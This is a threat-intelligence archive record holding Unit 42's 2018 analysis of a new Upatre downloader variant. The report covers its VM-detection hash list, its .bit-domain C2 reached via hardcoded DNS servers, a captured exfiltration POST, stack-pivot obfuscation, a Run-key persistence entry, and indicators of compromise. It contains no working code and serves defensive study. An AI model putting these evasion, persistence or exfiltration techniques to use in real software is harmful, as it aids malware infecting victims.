{
    "id": "0b77d1a2-4921-4735-bcb2-a133dceed3e8",
    "created_at": "2023-01-12T15:05:51.922275Z",
    "updated_at": "2025-03-27T02:05:53.129312Z",
    "deleted_at": null,
    "sha1_hash": "a2c3a2676f49cd2bd81330420b9795e19fe14dfa",
    "title": "2018-07-13 - Upatre Continued to Evolve with new Anti-Analysis Techniques",
    "authors": "",
    "file_creation_date": "2022-05-28T02:27:22Z",
    "file_modification_date": "2022-05-28T02:27:22Z",
    "file_size": 2718633,
    "plain_text": "# Upatre Continued to Evolve with new Anti-Analysis Techniques\n\n**[researchcenter.paloaltonetworks.com/2018/07/unit42-upatre-continues-evolve-new-anti-analysis-techniques/](https://researchcenter.paloaltonetworks.com/2018/07/unit42-upatre-continues-evolve-new-anti-analysis-techniques/)**\n\nMike Harbison, Brittany Barbehenn July 13, 2018\n\nBy [Mike Harbison and](https://unit42.paloaltonetworks.com/author/mike-harbison/) [Brittany Barbehenn](https://unit42.paloaltonetworks.com/author/brittany-ash/)\n\nJuly 13, 2018 at 5:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [dot-bit,](https://unit42.paloaltonetworks.com/tag/dot-bit/) [Downloader,](https://unit42.paloaltonetworks.com/tag/downloader/) [Namecoin,](https://unit42.paloaltonetworks.com/tag/namecoin/) [Upatre](https://unit42.paloaltonetworks.com/tag/upatre/)\n\nFirst discovered in 2013, Upatre is primarily a downloader tool responsible for delivering additional trojans onto the victim host. It is\nmost well-known for being tied with the Dyre banking trojan, with a peak of over 250,000 Upatre infections per month delivering Dyre\nback in July 2015. In November 2015 however, an organization thought to be associated with the Dyre operation was raided, and\nsubsequently the usage of Upatre delivering Dyre dropped dramatically, to less than 600 per month by January 2016.\n\nToday, the Upatre downloader tool is effectively no longer in use by criminal organizations. However, one of the many interesting\naspects of the Upatre tool had always been its constant adaptive nature where the developers continuously added features and\ncapabilities to the tool to increase its efficacy.\n\nIn March 2018, Unit 42 researchers collected a sample of Upatre which was compiled in December 2016 but at the time was largely\nundetectable by most automated detection systems . Because of this, we analyzed the sample to afford awareness to those\ninterested in this malware and its evolution. This previously undocumented variant features significant code flow obscuration, a pro re\nnata means of decryption for network communications, and of particular interest, the method in which this variant evades virtual\nmachine detection.\n\nIn this post we highlight these techniques identified during our analysis.\n\nMalware Overview\n\nUpatre is a stage-0 malware, which basically means it’s a downloader.  The malware is used to download and install a payload onto\nthe affected system. The payload is retrieved from hardcoded domain(s) and is typically another piece of malware. Historically,\n[Upatre has acted as a downloader for malware families such as Dyre,](https://www.symantec.com/security-center/writeup/2014-061713-0826-99) [GameOver Zeus,](https://www.us-cert.gov/ncas/alerts/TA16-091A) [Kegotip, Locky, and Dridex to name a few.](https://securityintelligence.com/the-necurs-botnet-a-pandoras-box-of-malicious-spam/)\nHowever, in this case no payload was delivered. Additionally, variants such as this one collect information from the target and transmit\nthe data via an HTTP POST request.\n\nThis newly observed variant comes packed with several characteristics and capabilities that stood out to us during analysis.\nAttributes in the PE header suggest that the malware is written in Visual C++ and several of the PE sections have high entropy\nclassification, which indicates that the binary is packed. The PE resource section also contains images of Google Chrome, so when\nthe binary is placed on the target machine, it appears to be that of the Google Chrome web browser.\n\nOne of the key features about this variant that stood out during our analysis is how it detects whether or not it is running within a\nvirtual machine. Although virtual machine detection is anything but new, in this variant, it is handled a bit differently than other\nsamples previously analyzed by Unit 42. To, evade detection, the newly observed variant enumerates the running processes on the\nhost, generates a CRC32 hash of the process name, performs an XOR with a hard-coded key of 0x0F27DC411, and finally compares\nthe newly computed value against a list of values stored in an array within the code. We observed the following values:\n\n0x6BA08023 0xDFF859A5 0x9649C9DF 0x91B88065 0xF663B61C\n\n\n-----\n\n0xC6E1589A 0xC63B2FDF 0xA9D475EF 0xCE9F7AE2 0xCF3B343A\n\n0x85D3D4E6 0x1392D4C 0xDFC3A97E 0x51ACC655 0xEF0F2980\n\n0x64EEAFAF 0xD5F11B49 0xC9823C94 0x9F4EE7C8 0x403C2A93\n\n0x6A50A975 0xECCCD158 0xED3CF80E 0x209202D5 0x2C6668C3\n\nThis version of Upatre will not transmit any data via HTTP POST to any of the target domains if one of these values is found.\n\nIn the event one of the values are found, the malware will sleep for six seconds and then will restart the entire check again.\n\nWe were unable to determine every corresponding process name from the CRC32 list above, however, we were able to decipher the\nfollowing process names:\n\nProcess Name CRC32\n\nvmtoolsd.exe 0xD5F11B49\n\nvmacthlp.exe 0x403C2A93\n\nPython.exe 0x209202D5\n\nOther notable functionality of this new version of the Upatre malware includes:\n\nIn-memory loading of code\nDisables the following Windows services:\n\nWindows Security Center\nInternet Connection Sharing\nWindows Firewall\nWindows Defender\nWindows Update\nWindows Defender Network Inspection Service\nDisables Windows security notification balloons on Windows 7 and up\nDisables Internet Explorer Phishing Filter\nDisables Windows User Access Control Notifications\nLaunches a trusted Windows application msiexec.exe and injects code into its memory space using an undocumented\ntechnique\nHeavy use of obfuscated and optimized code to thwart code analysis\nUse of non-essential Windows API's for stack pivoting to mask intended API\nMultiple layers of custom encoding used for individual strings decoding. Does not share encoding routine with other encoded\nvalues\n\nNetwork Communication\n\nAnother feature of this sample is the use of top level domains (TLD) of. bit. The intended domains are encrypted and only decrypted\nwhen the malware is ready to use them. This new sample attempts to resolve two domains, bookreader[.]bit and doghunter[.]bit via\nthe following hardcoded DNS Servers:\n\n31.3.135[.]232\n193.183.98[.]154\n5.135.183[.]146\n84.201.32[.]108\n185.133.72[.]100\n96.90.175[.]167\n104.238.186[.]189\n\nDNS resolution for .bit domains use hardcoded DNS servers and is handled via TCP versus traditional UDP. This is because .bit\ndomains are based on Namecoin and aren’t regulated by ICANN. Additionally, the hardcoded DNS server IPs we identified in this\nsample are all associated with OpenNIC Public DNS servers.\n\nAccording to [OpenNIC, when using OpenNIC DNS servers .bit domains are resolved through centralized servers that generate a DNS](https://wiki.opennic.org/opennic/dot/bit)\n\n\n-----\n\nzone from the Namecoin blockchain; therefore, the secure nature of using Namecoin as a decentralized means of DNS is not actually\nbeing utilized here.\nIf domain resolution is successful, the malware will then perform an HTTP POST request similar to the following:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nPOST / HTTP/1.0\nHost: bookreader[.]bit\nContent-Length: 1024\nÞm  á9,9r.@¿æ[.\"  Š?.àì..Cl„8f·Ö'LsÃøPi;±›hÏÀ¨*-2IóÙ4²R–k\"à{..rè!..~5¹ qr^.¡h•âÔ?ý.ˆ¬–À$.Ÿ?óa..r(ì ÑÖ¹Û.Î.·‹ÅE.ûÉn¯&{qûÿ\n´©Ø.öî\",.YÒ!p†³3jÓ_sÐ.Páu».. KŠ†ÐïwÂ:š.¦Ú÷€âC\nnaH¾Û.½†¸q.TJ7.¾šB' ?.®îîGHxãGd\\¦jæµ.jGæûsðá].8®.Ï.X#8ç.Ô< ¹6ßŽÄ. î¥µ.ù..€¬«ˆ@æ_t.,á.‡q.Ô¤.'³åÿW·äZ.ìa:©\"ïIãÌ.\n¤ô~œ  ïÒ§vBå|Ù«Ìfa.„{7Œìt.˜l_.ŒKNEÏg'¸O‹¯IWy.²«•  Ú…•j'Û'Š.b.t‡|Å..Œn†´ÕK¨‰»%ðfh  Eºw*¤šf‰Ò2š'¥V..qZÖ(«86ç\n˜W©g†ÕËÖ™.\"Í.Õüþs8Ts½.=Ö\\ókÌäE¨Ë†>¡¾ü\\±ˆbÂï>;9.Ã'ØœZuá©:=ÇTx˜ufýÉg.Ã·.Šâ >.Èq.Ó9wnÖ.Ö[aöÝÇé1.Ÿ†HÁè–\n¡>EhÂÙ.9©!©t .\"`éh.™^).ž½C.,º3õnØÑÙéîN0`-°[1×ß(J.ÃwXô`¥Ø÷²';B1/¤¤+wTg›¾Qf-ß.ÿ\"|fßX.,ãAÝêâºøbËe¾8X.0‡h…\ni9ÊŸF÷~GÞ =..Œþj'>Ž.°øô.\"U„ ÖóÙæ¯'s.O/oŒØã‰sœàá‡.Ø2ú{Œ»êt»§hé±.Z#r.é.<ýj®½Ü¡\\(.….%ñŽËj..œ.¶\nDì\"®Ñ2xf4+ÀŒÖföUv•ê\\.äÓó¢Íéô¥.  „¦©V…–3×.Y.ŒÔm8ò@†.~b«Ñ—..JW/éé.eE.Ó.¬†\n89.E(=áø\"¿.>ø»¾åêŠ.¬2©Áä¬xýËù<š.Ð.;éàE‰+&xAEç>\"@LpßÇ¢7ãÔÞ@~Âfß+Z±*òF=aWÂÖµÐe_ëÆ§ë&`|.>VøÂá.C7ñ‚¯iÚ.µ.\n´)!Ïª.ÇyO[‹¾?Js¨e\njKß±¯Z].613ŒÐ.|XÝõÿÊý;nU0Mw‚M»«½:Û?/æ.$)¶ì_X.p.q.8.Ÿj€¬.œàï..B·âoŽM.êÅb¥8aÕù©s$ÏmhT£»¤/wwÆ6\ny=€ƒÖG™Úu yÍÆ²\".® !BùìâÃ.=¦6<)º\n5M´yótI\\\n\n\nNote, the HTTP POST does not contain any User-Agent strings.\nAt this time, we don’t fully understand the encryption method; however, we know that the data sent in the POST request is encrypted\nusing a custom encryption algorithm. Below is an example of data captured prior to encryption:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n00000010  00 00 00 00 60 00 00 00 00 00 00 00 01 00 00 00  ....`...........\n00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n00000030  11 27 00 00 00 00 00 00 20 00 00 00 20 00 00 00  .'...... ... ...\n00000040  57 49 4E 2D 52 49 38 38 4C 38 56 4D 45 38 4D 5F  WIN-RI88L8VME8M_\n00000050  45 35 33 32 36 34 38 41 37 36 31 46 34 43 35 41  E532648A761F4C5A\n00000060  AB AB AB AB AB AB AB AB 00 00 00 00 00 00 00 00  ««««««««........\n00000070  8B BB 9F 39 09 63 00 00 30 28 31 00 08 21 31 00  ‹»Ÿ9.c..0(1..!1.\n00000080  EE FE EE FE EE FE EE FE EE FE EE FE EE FE EE FE  îþîþîþîþîþîþîþîþ\n00000090  EE FE EE FE EE FE EE FE EE FE EE FE EE FE EE FE  îþîþîþîþîþîþîþîþ\n000000A0  9F BB 9C 2E 00 63 00 18 70 1B 31 00 60 21 31 00  Ÿ»œ..c..p.1.`!1.\n000000B0  78 1B 31 00 68 21 31 00 70 21 31 00 80 CF 2B 00  x.1.h!1.p!1.€Ï+.\n000000C0  00 00 1D 74 8D 12 1D 74 00 70 00 00 3C 00 3E 00  ...t...t.p..<.>.\n000000D0  38 20 31 00 14 00 16 00 60 20 31 00 04 40 0C 00  8 1.....` 1..@..\n000000E0  01 00 00 00 B0 A6 BA 77 BC 38 28 00 43 DB 5B 4A  ....°¦ºw¼8(.CÛ[J\n000000F0  00 00 00 00 00 00 00 00 F8 1F 31 00 F8 1F 31 00  ........ø.1.ø.1.\n00000100  00 20 31 00 00 20 31 00 38 23 31 00 90 20 31 00  . 1.. 1.8#1.. 1.\n00000110  54 05 B4 77 00 00 D9 3F D5 8A 48 B8 82 D1 D3 01  T.´w..Ù?ÕŠH¸‚ÑÓ.\n00000120  AB AB AB AB AB AB AB AB 00 00 00 00 00 00 00 00  ««««««««........\n00000130  86 BB 9C 37 14 63 00 1A 43 00 3A 00 5C 00 57 00  †»œ7.c..C.:.\\.W.\n00000140  69 00 6E 00 64 00 6F 00 77 00 73 00 5C 00 73 00  i.n.d.o.w.s.\\.s.\n00000150  79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00  y.s.t.e.m.3.2.\\.\n00000160  57 00 49 00 4E 00 4E 00 53 00 49 00 2E 00 44 00  W.I.N.N.S.I...D.\n\n\nObscuring Code Flow\nThis version of Upatre contains significantly obfuscated code to increase the difficulty of analysis. Figure 1 below shows an example\nAPI call disassembled in IDA Pro.\n\n_Figure 1-IDA Disassembly of API call_\n\n\n-----\n\n[For conventional naming, the function at address 0x00137ED6 has been renamed to the Windows API RegQueryValueEx_0.](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724911%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396)\nAccording to MSDN this function takes six parameters, the frame pointer is ESP based and the stack frame would resemble the\nfollowing:\n\n_Figure 2-Inside Func_RegQueryvalueEx_0_\n\nIn the above figure, Func_RegQueryValueEx_0 is EBP based and performs the following:\n\nSaves the current stack pointer in EBP\nThe stack pointer is adjusted 268 bytes (thwarting stack frame analysis)\nPushes a pointer, which points to the REGKEY string\n\nAfter the call into sub_140CBE the stack would resemble the following:\n\n_Figure 3--Inside Sub_140CBE_\n\nFunction Sub_140CBE does the following:\n\nPushes 0x13 on the stack\nCalls another function, which ends up jumping into the Windows API GetSystemMetrics\n\n\n-----\n\n0x13 is the SM_CSURSOR index used by GetSystemMetrics, which returns the width of a cursor in pixels. Retrieving this value has\n**no bearing on the program as the return value is not used.**\nHow the stack looks after the call to func_GetSytemMetrics\n\n_Figure 4--Inside Func_GetSystemMetrics_\n\nSome interesting observations about this function:\n\nThe JMP instruction is used versus the CALL instruction as JMP doesn’t affect the stack.\nThe two PUSH instructions are junk values and only used to pivot the stack, so the correct return address is on the stack during\nthe return.\n\nHere is how the stack looks prior to the jump:\n\nReturn address 0x001414FD is the address that is used to open and query the hosts registry, and this is the target address after\nexecuting the above instructions. The return code flow is as follows:\n\n1. The two junk data values pushed on the stack are cleared during the executing of the GetSystemMetrics API.\n2. The stack pointer is incremented past 0x13\n3. Address 0x00140CC5 has a retn instruction\n4. Address 0x001414FD is now on the top of the stack and the section within the malware that handles Windows registry\n\nenumeration is called (RegQueryValueEx).\n\nThis stack pivot is performed entirely to make static analysis of the file more difficult, but the end result is still that the API function\nexecutes, and the malware accomplishes its task.\n\nPersistence Technique\n\nTo establish persistence, this new version of Upatre creates the following registry key:\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\n\n\n-----\n\nString value x$msbuild where x$ is a random alpha character. Note: the name of the binary depends on the executable that is\n_running. The stub program grabs the Windows name of the EXE and prepends it with a random value._\nData -->C:\\ProgramData\\MSBuild\\x$exe\n\nFile x$MSBuild.exe is then copied to the host's C:\\ProgramData\\MSBuild folder.\n\nConclusion\n\nIn our data, we have observed over 119,000 unique malware samples that use dot-bit (.bit) domains for C2 infrastructure as early as\n2014. Malware families observed include Necurs, GandCrab, Vobfus, Tofsee, Floxif, Ramnit, and several others.\nDue to the C2 domains being down at the time of our analysis, which was unsurprising given the potential age of the sample, we were\nnever able to capture the ultimate payload for this new Upatre variant. However, open source analysis on this variant identified\nanother sample configured with the same dot-bit domains. The sample,\n94a8b4b22dab4171edde5b1bafbf2f17dbe3c3c4c01335c36ba3b6e5d3635b83, was compiled six days after our Upatre sample and\ndelivered the Chthonic banking trojan via RIG exploit kit.\nAlthough the delivery mechanism was not observed during our analysis, Upatre typically arrives via an email link/attachment or\nthrough a compromised website.\n\n**Defending Against this Threat**\nThe Upatre malware is constantly changing and is capable of downloading many different malware families, some, destructive. Using\nthreat detection and prevention solutions such as the Palo Alto Networks next-generation security platform are highly recommended\nas part of a proactive cyber security strategy. WildFire and Traps both detect the samples described in this report as malicious.\nNot all dot-bit domains are malicious, but organizations should take steps to ensure they can control access to all potentially malicious\ndomains. Blocking outbound access to DNS servers and re-routing DNS requests to internally controlled DNS servers can help\nprotect a network from malware using dot-bit domains provided by the Namecoin network.\n[Palo Alto Networks customers remain protected from Upatre and can identify this threat using the Upatre tag in AutoFocus.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Upatre)\n\n**Indicators of compromise associated with this analysis include:**\n\n**Upatre**\nSHA256:  8ac7909730269d62efaf898d1a5e87251aadccf4349cd95564ad6a3634ba4ef4\n**Cthonic**\nSHA256:  94a8b4b22dab4171edde5b1bafbf2f17dbe3c3c4c01335c36ba3b6e5d3635b83\n**C2s**\nDomain:  doghunter[.]bit\nDomain:  bookreader[.]bit\nIP Address: 31.3.135[.]232\nIP Address: 193.183.98[.]154\nIP Address: 5.135.183[.]146\nIP Address: 84.201.32[.]108\nIP Address: 185.133.72[.]100\nIP Address: 96.90.175[.]167\nIP Address: 104.238.186[.]189\n\nUpdated on 7/13/2018 to clarify that the Upatre sample discussed was compiled in 2016 but is newly discovered in 2018 and to\nmore clearly identify samples with their hashes.\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-07-13 - Upatre Continued to Evolve with new Anti-Analysis Techniques.pdf"
    ],
    "report_names": [
        "2018-07-13 - Upatre Continued to Evolve with new Anti-Analysis Techniques.pdf"
    ],
    "threat_actors": [
        {
            "id": "7ea1e0de-53b9-4059-802f-485884180701",
            "created_at": "2022-10-25T16:07:24.04846Z",
            "updated_at": "2025-03-27T02:02:10.090459Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "APT-C-09",
                "ATK 11",
                "Capricorn Organisation",
                "Chinastrats",
                "Dropping Elephant",
                "Maha Grass",
                "Quilted Tiger",
                "TG-4410",
                "Thirsty Gemini",
                "Zinc Emerson"
            ],
            "source_name": "ETDA:Patchwork",
            "tools": [
                "AndroRAT",
                "Artra Downloader",
                "ArtraDownloader",
                "AutoIt backdoor",
                "BADNEWS",
                "BIRDDOG",
                "Bahamut",
                "Bozok",
                "Bozok RAT",
                "Brute Ratel",
                "Brute Ratel C4",
                "CinaRAT",
                "Crypta",
                "ForeIT",
                "JakyllHyde",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "NDiskMonitor",
                "Nadrac",
                "PGoShell",
                "PowerSploit",
                "PubFantacy",
                "Quasar RAT",
                "QuasarRAT",
                "Ragnatela",
                "Ragnatela RAT",
                "SocksBot",
                "TINYTYPHON",
                "Unknown Logger",
                "WSCSPL",
                "Yggdrasil"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c81067e0-9dcb-4e3f-abb0-80126519c5b6",
            "created_at": "2022-10-25T15:50:23.285448Z",
            "updated_at": "2025-03-27T02:00:55.42906Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "Hangover Group",
                "Dropping Elephant",
                "Chinastrats",
                "Operation Hangover"
            ],
            "source_name": "MITRE:Patchwork",
            "tools": [
                "NDiskMonitor",
                "QuasarRAT",
                "BackConfig",
                "TINYTYPHON",
                "AutoIt backdoor",
                "PowerSploit",
                "BADNEWS",
                "Unknown Logger",
                "Socksbot"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535951,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653704842,
    "ts_modification_date": 1653704842,
    "files": {
        "pdf": "https://archive.orkl.eu/a2c3a2676f49cd2bd81330420b9795e19fe14dfa.pdf",
        "text": "https://archive.orkl.eu/a2c3a2676f49cd2bd81330420b9795e19fe14dfa.txt",
        "img": "https://archive.orkl.eu/a2c3a2676f49cd2bd81330420b9795e19fe14dfa.jpg"
    }
}